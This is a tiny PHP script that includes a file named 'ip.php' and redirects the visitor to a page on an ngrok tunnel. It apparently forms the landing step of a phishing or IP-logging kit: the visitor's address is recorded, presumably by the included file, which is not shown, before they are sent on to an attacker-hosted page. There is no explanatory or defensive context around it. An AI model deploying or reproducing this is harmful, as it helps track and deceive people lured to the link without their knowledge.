<?php
include 'ip.php';
header('Location: https://c0e230e7.ngrok.io/index2.html');
exit
?>
